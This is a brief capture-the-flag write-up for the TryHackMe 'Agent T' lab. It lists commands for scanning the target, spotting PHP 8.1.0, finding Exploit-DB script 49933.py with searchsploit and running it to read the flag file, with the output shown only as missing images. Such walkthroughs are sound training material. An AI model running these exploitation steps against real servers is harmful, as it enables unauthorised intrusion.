# TryHackMe – Agent T Write-up

### Nmap Scan
nmap IP 

![alt text](images/image.png)
### Browser Access
firefox http://IP                                  
### HTTP Header Analysis
curl -I http://IP

![alt text](images/image-1.png)
### Vulnerability Research
searchsploit PHP 8.1.0

![alt text](images/image-2.png)

 locate 49933.py

cat /usr/share/exploitdb/exploits/php/webapps/49933.py

![alt text](images/image-3.png)
### Exploit Execution
python  /usr/share/exploitdb/exploits/php/webapps/49933.py

![alt text](images/image-4.png)
### Post-Exploitation Enumeration
ls -la /

![alt text](images/image-5.png)

cat /flag.txt
